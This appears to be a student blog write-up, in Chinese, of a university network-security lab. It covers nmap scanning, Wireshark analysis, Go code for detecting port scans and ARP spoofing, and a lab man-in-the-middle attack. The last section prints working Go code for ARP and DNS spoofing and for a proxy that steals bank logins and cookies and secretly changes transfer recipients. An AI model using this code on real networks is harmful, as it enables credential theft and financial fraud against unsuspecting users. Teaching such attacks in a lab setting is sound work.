---
title: CS155-Networking
categories:
  - CS155
tags:
  - NetworkSecurity
abbrlink: f78f4144
date: 2024-03-27 14:14:35
---

## Introduction

这个实验是关于网络安全的，我们将使用现有的软件来检查远程机器和本地流量，同时扮演一个 强大的网络攻击者的角色。并且，本次实验使用 Go 语言来完成。

本次实验主要涉及到 nmap、Wireshark、ARP 欺骗、DNS 欺骗和中间人攻击。

## Nmap Port Scanning

安装 nmap：

```shell
sudo apt install nmap
```

1. 使用 TCP SYN 扫描。使用 `-sS` 选项即可。
2. 启用操作系统检测、版本检测、脚本扫描和 `traceroute`，分别使用 `-O -sV -sC -traceroute` 选项即可，也可以使用 `-A` （Aggressive）这一个选项来代替。
3. 执行快速扫描，使用 `-T4` 选项。
4. 扫描所有端口，使用 `-p-` 选项。

因此，最终构造的命令如下：

```shell
sudo nmap -sS -A -T4 -p- sacnme.nmap.org
```

该域名对应的 IP 地址为 `45.33.49.119`，通过下面的结果可以看到：

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-05 10:49 CST
Nmap scan report for sacnme.nmap.org (45.33.49.119)
Host is up (0.24s latency).
Other addresses for sacnme.nmap.org (not scanned): 2600:3c01:e000:3e6::6d4e:7061
```

rDNS record（反向 DNS 记录）是一种 DNS 记录，它将 IP 地址映射到域名，可以用于确定一个 IP 地址所属的主机名或域名。在进行网络扫描时，rDNS record 可以帮助识别目标主机的真实身份，从而帮助评估网络风险和制定安全策略。

```
rDNS record for 45.33.49.119: ack.nmap.org
```

扫描的结果如下：

```
Not shown: 65529 filtered ports
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:e0:c6:cd:14:00:00:db:b6:b0:3d:f2:0a:2a:3b:6d (RSA)
|   256 88:2b:29:00:d0:c7:81:ac:dd:f4:90:42:d2:aa:f0:5b (ECDSA)
|_  256 64:d6:39:35:04:76:1c:ba:17:f3:fd:4f:1f:b3:71:61 (ED25519)
70/tcp    closed gopher
80/tcp    open   http    Apache httpd 2.4.6
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Did not follow redirect to https://nmap.org/
113/tcp   closed ident
443/tcp   open   ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.6 (CentOS)
|_http-title: Did not follow redirect to https://nmap.org/
| ssl-cert: Subject: commonName=insecure.com
| Subject Alternative Name: DNS:insecure.com, DNS:insecure.org, DNS:issues.nmap.org, DNS:issues.npcap.org, DNS:nmap.com, DNS:nmap.net, DNS:nmap.org, DNS:npcap.com, DNS:npcap.org, DNS:seclists.com, DNS:seclists.net, DNS:seclists.org, DNS:sectools.com, DNS:sectools.net, DNS:sectools.org, DNS:secwiki.com, DNS:secwiki.net, DNS:secwiki.org, DNS:svn.nmap.org, DNS:www.nmap.org
| Not valid before: 2023-04-13T09:03:55
|_Not valid after:  2023-07-12T09:03:54
|_ssl-date: TLS randomness does not represent time
31337/tcp closed Elite
```

服务器的操作系统信息如下：

```
Aggressive OS guesses: Linux 2.6.32 - 3.13 (95%), Linux 2.6.22 - 2.6.36 (93%), Linux 3.10 - 4.11 (93%), Linux 2.6.39 (93%), Linux 3.10 (93%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 2.6.32 - 3.10 (92%), Linux 2.6.18 (91%), Linux 3.16 - 4.6 (91%)
No exact OS matches for host (test conditions non-ideal).
```

traceroute 结果较长，经过了 21 跳才抵达目标主机。本次扫描花费了 6 分钟左右。

## Wireshark Packet Sniffing

**服务器对发送到“closed”端口的 SYN 数据包的响应是什么 TCP 数据包类型？**

通过 wireshark 抓包后，添加筛选规则 `ip.addr == 45.33.49.119 and tcp.port == 70`，这里的 ip 地址和 closed 端口通过第一部分就知道了，得到的结果如下：

![image-20230505115043241](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230505115043241.png)

我们通过 Seq 和 Ack 的关系，可以知道，第二条记录是对第一条记录的响应，第六条记录是对第三条记录的响应。因此，对于 closed 端口，nmap 给它发送 SYN 数据包后，它会回复一个 RST 数据包。

RST 数据包用于终止一个连接或拒绝一个连接请求，表示该端口已关闭。

**服务器对发送到“filtered”端口的 SYN 数据包的响应是什么 TCP 数据包类型？**

随便选一个“filtered”端口，比如 88，在 wireshark 中筛选了之后，结果如下：

![image-20230505115914240](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230505115914240.png)

发了两次 SYN，但是没有任何回应。

**除了向 Web 服务器执行 HTTP GET 请求外，nmap 还发送哪些其他 HTTP 请求类型？**

添加过滤器如下：

```
ip.addr == 45.33.49.119 and http.request.method != GET
```

得到的结果如下：

![image-20230505120750306](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230505120750306.png)

可以看到，除了 GET 请求，还发送了 POST、OPTIONS、PROPFIND、HEAD 请求。

- POST：使用 POST 请求方法来探测目标主机的开放端口和服务。例如，当目标主机上存在 Web 应用程序时，nmap 可能会使用 POST 请求来模拟表单提交和其他数据提交操作，以探测是否存在漏洞或其他安全问题。
- HEAD：类似于 GET 请求，但不返回响应正文。nmap 可以使用 HEAD 请求来探测 Web 服务，并获取服务器响应头信息，例如服务器类型、状态码等。
- OPTIONS：用于获取有关服务器支持的请求方法、响应格式和其他相关信息的元数据。nmap 可以使用 OPTIONS 请求来探测 Web 服务，并确定服务器支持哪些请求方法。
- PROPFIND：用于在 WebDAV 中获取资源的属性。nmap 可以使用 PROPFIND 请求来探测 WebDAV 服务，并获取有关资源的元数据，例如文件大小、创建日期等。

**nmap 根据哪些 TCP 参数以确定指定主机的操作系统？**

通过窗口大小、时间戳、初始序列号、紧急指针、Options 等字段，可以推测远程主机正在使用的操作系统和网络栈。比如基于 Unix 还是基于 Windows 的操作系统的时间戳是不同的。

## Programmatic Packet Processing

在这个任务中，需要编程分析 PCAP（数据包捕获）文件，以检测可疑行为。具体来说，我们要尝试识别**端口扫描**和 **ARP 欺骗**。

- 端口扫描：由于大多数主机不准备在任何给定端口上接收连接，通常在端口扫描期间，与最初接收的 SYN 数据包相比，会有数量少得多的主机响应 SYN+ACK 数据包。

- ARP 欺骗：ARP 欺骗是一种利用地址解析协议的攻击，因为 ARP 数据包没有经过身份验证，所以任何设备都可以声称拥有任何 IP 地址。在 ARP 欺骗攻击中，攻击者反复发送声称控制某个地址的未经请求的回复，目的是拦截绑定到另一个系统的数据，从而对网络上的其他用户进行中间人或拒绝服务攻击。

首先，运行 `go module download` 下载 gopacket 包，然后补全代码如下：

```go
if tcpLayer != nil && ipLayer != nil && etherLayer != nil {
    ip, _ := ipLayer.(*layers.IPv4)
    srcIP := ip.SrcIP.String()
    dstIP := ip.DstIP.String()
    tcp, _ := tcpLayer.(*layers.TCP)
    syn := tcp.SYN
    ack := tcp.ACK
    if syn && !ack {
        // 向 srcIP 发送一次 SYN
        if _, ok := addresses[srcIP]; !ok {
            addresses[srcIP] = [2]int{0, 0}
        }
        arr := addresses[srcIP]
        arr[0]++
        addresses[srcIP] = arr
    } else if syn && ack {
        // 接受到 dstIP 发送的一次 SYN-ACK
        if _, ok := addresses[dstIP]; !ok {
            addresses[dstIP] = [2]int{0, 0}
        }
        arr := addresses[dstIP]
        arr[1]++
        addresses[dstIP] = arr
    }
```

我们需要筛选出发送 SYN 数据包超过 5 次，并且发送 SYN 数据包的次数是接收 SYN-ACK 数据包的三倍以上的目标 IP 地址：

```go
for ip, addr := range addresses {
    if addr[0] > 5 && addr[0] > 3*addr[1] {
        fmt.Println(ip)
    }
}
```

对于 ARP 欺骗，首先需要解析出 ARP 数据包，然后解析出 src 和 dst 的 IP 以及 MAC，处理如下：

```go
if arpLayer != nil && etherLayer != nil {
    arp, _ := arpLayer.(*layers.ARP)
    srcIP := net.IP(arp.SourceProtAddress).String()
    dstIP := net.IP(arp.DstProtAddress).String()
    srcMAC := net.HardwareAddr(arp.SourceHwAddress).String()
    dstMAC := net.HardwareAddr(arp.DstHwAddress).String()
    // fmt.Println(srcIP, dstIP, srcMAC, dstMAC)
    if arp.Operation == 1 {
		// ARP 请求包，记录下谁在请求
        if _, ok := arpRequests[srcIP]; !ok {
            arpRequests[srcIP] = make(map[string]int)
        }
        arpRequests[srcIP][srcMAC]++
    } else if arp.Operation == 2 {
        // ARP 响应包，判断要给谁，如果它之前请求了就匹配一次，没有就说明非法 ARP
        if _, ok := arpRequests[dstIP]; ok && arpRequests[dstIP][dstMAC] > 0 {
            arpRequests[dstIP][dstMAC]--
        } else {
            arpMac[srcMAC]++
        }
    }
}
```

我们需要筛选出非法响应超过 5 次的 MAC 地址：

```go
for mac, count := range arpMac {
    if count > 5 {
        fmt.Println(mac)
    }
}
```

运行结果如下，和实验文档上给的一致：

![image-20230510115924407](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230510115924407.png)

## Monster-in-the-Middle Attack

在本任务中，我们将扮演网络攻击者的角色，诱使受害者的 web 浏览器连接到攻击者的 web 服务器，而不是受害者想要访问的实际网站。通过这样做，攻击者可以执行中间人攻击，在窃取机密信息的过程中，在不被注意的情况下将受害者的请求转发到网站或从网站转发。

要做到这一点，我们伪造 ARP 响应，以欺骗用户将攻击者的设备用作 DNS 服务器。然后，您需要发送一个伪造的 DNS 响应，诱骗用户将主机名 fakebank.com 与攻击者的 IP 地址而不是其真实地址相关联。一旦 DNS 响应被成功欺骗，您将接受受害者的连接，并将所有 HTTP 请求转发到 fakebank.com 的实际网络服务器。

> 通过 ARP 欺骗，伪装成 DNS 服务器，将用户要访问的 fakebank.com 解析到攻击者的 IP 地址上！

然后实现 HTTP 代码，对攻击用户不可感知。

1.   当用户向 /login 页面发送 POST 请求时，我们窃取用户名和密码后将其转发；
2.   当用户向 /transfer 页面发送 POST 请求时，我们将转账目标方修改为 Jason，再响应时修改回去，欺骗用户；
3.   当用户向 /logout 页面发送 POST 请求时，关闭连接并退出；
4.   当接收到 /kill 页面的请求时，程序退出；
5.   其他请求，窃取 cookie 后原样转发。

首先，我们看 ARP 欺骗部分，首先，使用如下的结构体存储 ARP 包解析数据，这是因为只需要知道源 IP 和 MAC 以及目的 IP 即可，目的 MAC 由我们伪造：

```go
type ARPIntercept struct {
	SourceHwAddress   net.HardwareAddr
	SourceProtAddress net.IP
	DstProtAddress    net.IP
}
```

解析 ARP 协议如下：

```go
if arpData.Operation == 1 && !bytes.Equal(arpData.SourceHwAddress, cs155.GetLocalMAC()) {
    if net.IP(arpData.DstProtAddress).String() == "10.38.8.2" {
        intercept := ARPIntercept{net.HardwareAddr(arpData.SourceHwAddress), net.IP(arpData.SourceProtAddress), net.IP(arpData.DstProtAddress)}
        sendRawEthernet(spoofARP(intercept))
    }
}
```

使用如下代码构造 ARP 响应包：

```go
arp := &layers.ARP{
		AddrType:        layers.LinkTypeEthernet,
		Protocol:        layers.EthernetTypeIPv4,
		HwAddressSize:   6, // number of bytes in a MAC address
		ProtAddressSize: 4, // number of bytes in an IPv4 address
		Operation:       2, // Indicates this is an ARP reply
		SourceHwAddress: cs155.GetLocalMAC(),
		SourceProtAddress: intercept.DstProtAddress,
		DstHwAddress: intercept.SourceHwAddress,
		DstProtAddress: intercept.SourceProtAddress,
	}
	ethernet := &layers.Ethernet{
		EthernetType: layers.EthernetTypeARP,
		SrcMAC: cs155.GetLocalMAC(),
		DstMAC: intercept.SourceHwAddress,
	}
```

为了实现 DNS 欺骗，我们使用如下结构体，存储接收到的 DNS 请求包中的有用数据：

```go
type dnsIntercept struct {
	SrcIP   net.IP
	DstIP   net.IP
	SrcPort layers.UDPPort
	DstPort layers.UDPPort
}
```

当接收到 DNS 请求包时，我们使用如下的代码解析：

```go
if dnsLayer := dnsPacketObj.Layer(layers.LayerTypeDNS); dnsLayer != nil {
    dnsData, _ := dnsLayer.(*layers.DNS)
    var intercept dnsIntercept
    if string(dnsData.Questions[0].Name) == "fakebank.com" && dnsData.Questions[0].Type == layers.DNSTypeA {
        ipLayer := packet.Layer(layers.LayerTypeIPv4)
        ipData, _ := ipLayer.(*layers.IPv4)
        udpData, _ := udpLayer.(*layers.UDP)
        intercept.SrcIP = ipData.SrcIP
        intercept.DstIP = ipData.DstIP
        intercept.SrcPort = udpData.SrcPort
        intercept.DstPort = udpData.DstPort
        buffer_bytes := spoofDNS(intercept, gopacket.Payload(payload))
        sendRawUDP(int(udpData.SrcPort), ipData.SrcIP, buffer_bytes)
    }
}
```

在构造 DNS 响应包时，和 ARP 基本一致：

```go
ip := &layers.IPv4{
    Version: 4,
    Protocol: layers.IPProtocolUDP,
    SrcIP: intercept.DstIP,
    DstIP: intercept.SrcIP,
}
udp := &layers.UDP{
    SrcPort: intercept.DstPort,
    DstPort: intercept.SrcPort,
}

// TODO #7: Populate the DNS layer (dns) with your answer that points to the attack web server
// Your business-minded friends may have dropped some hints elsewhere in the network!

var answer layers.DNSResourceRecord
answer.Type = layers.DNSTypeA
answer.Name = []byte("fakebank.com")
localIP, _, _ := net.ParseCIDR(cs155.GetLocalIP())
answer.IP = localIP

dns.Answers = append(dns.Answers, answer)
dns.ANCount = 1
dns.QR = true
dns.ResponseCode = layers.DNSResponseCodeNoErr
```

接下来，我们实现 HTTP 代理服务器，按照说明，实现功能如下：

```go
if origRequest.URL.Path == "/login" {
    origRequest.ParseForm()
    var body = strings.NewReader(origRequest.Form.Encode())
    bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, body)
    var username = origRequest.Form.Get("username")
    var password = origRequest.Form.Get("password")
    cs155.StealCredentials(username, password)
} else if origRequest.URL.Path == "/logout" {
    bankRequest, _ = http.NewRequest("POST", bankURL, nil)
} else if origRequest.URL.Path == "/transfer" {
    origRequest.ParseForm()
    origRequest.Form.Set("to", "Jason")
    var body = strings.NewReader(origRequest.Form.Encode())
    bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, body)
} else {
    bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, origRequest.Body)
}
```

在给用户数据时，/transfor 页面还需要修改 to 字段的值，

```go
if origRequest.URL.Path == "/transfer" {
		origRequest.ParseForm()
		body, _ := ioutil.ReadAll(bankResponse.Body)
		var recipient = origRequest.Form.Get("to")
		var bodyReplaced = strings.ReplaceAll(string(body), "Jason", recipient)
		bankResponse.Body = ioutil.NopCloser(strings.NewReader(bodyReplaced))
	}
```

执行程序如下：

![image-20230530025901812](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230530025901812.png)

执行结果如下：

![image-20230530030111079](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20230530030111079.png)